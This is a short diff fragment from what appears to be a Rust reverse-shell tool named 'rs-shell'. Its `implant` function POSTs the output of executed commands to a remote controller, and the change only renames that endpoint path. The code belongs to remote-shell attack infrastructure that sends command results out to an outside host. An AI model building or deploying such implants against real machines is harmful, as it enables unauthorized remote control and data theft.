@@ -248,7 +248,7 @@ pub fn implant(ip: &str) -> Result<(), Box<dyn Error>> {
                                 match unsafe {
                                     make_request(
                                         h_connect,
-                                        "/rs-shell/output_imp",
+                                        "/rs-shell/receive_output",
                                         "POST",
                                         res_cmd.as_mut_ptr() as *mut c_void,
                                         res_cmd.len() as u32,
